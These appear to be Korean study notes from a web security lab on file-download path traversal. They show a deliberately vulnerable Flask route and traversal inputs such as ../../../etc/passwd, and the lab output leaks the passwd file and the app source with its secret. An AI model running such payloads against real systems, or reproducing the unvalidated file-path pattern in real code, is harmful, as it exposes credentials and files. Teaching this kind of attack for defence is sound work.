File Download : 
    사용자가 입력한 파일이름을 검증하지 않은 채 그대로 다운로드를 제공하는 행위

    ex)
        ...
        @app.route("/download")
        def download():
            filename = request.args.get("filename", "")
            return open("uploads/" + filename, "rb").read()
        ...

    사용자가 uploads 디렉토리 안에 존재하는 파일만 다운로드할 수 있을 것이라 생각하지만,
    Path Traversal을 이용해 더 상위 경로에 존재하는 시스템 파일, 설정 파일 등 중요한 정보들 다운로드 가능

    정상적 다운로드 요청 :
        http://example.com/download?filename=docs.pdf

    File Download 공격 : 계정 파일 다운로드
        http://example.com/download?filename=../../../../etc/passwd

    소스 코드, 관리자 패스워드, 서비스 키, 설정 파일 등 유출 가능 => 이차적인 공격의 발판

실습 :
취약점 코드
...
Secret = "********"
...
@app.route("/download")
def download():
    filename = request.args.get("filename")
    content = open("./uploads/" + filename, "rb").read()
    return content
...

디렉토리
app
    ㄴ src
        ㄴ uploads
        ㄴ upload.txt
    ㄴ app.py
        ㄴ templates
        ㄴ index.html
    ㄴ requirements.txt
etc
    ㄴ passwd
    ㄴ hosts
    ㄴ issue
proc
    ㄴ self
        ㄴ cmdline
        ㄴ environ
        ㄴ maps
home
    ㄴ dreamhack
        ㄴ .bash_history

입력 :
    Path > upload.txt
    Full path : /app/src/uploads/upload.txt
출력 :
    Upload test !
입력 :
    Path > ../../../etc/passwd
    Full path : /etc/passwd
출력 :
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    dreamhack:x:1000:1000::/home/dreamhack:

입력 :
    Path > ../app.py
    Full path: /app/src/app.py
             
출력 :
              from flask import Flask, render_template, request
app = Flask(__name__)

Secret = "Melon"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/download")
def download():
    filename = request.args.get("filename")
    content = open("./uploads/" + filename, "rb").read()
    return content

if __name__ == "__main__":
    app.run()
// secret 값 얻음





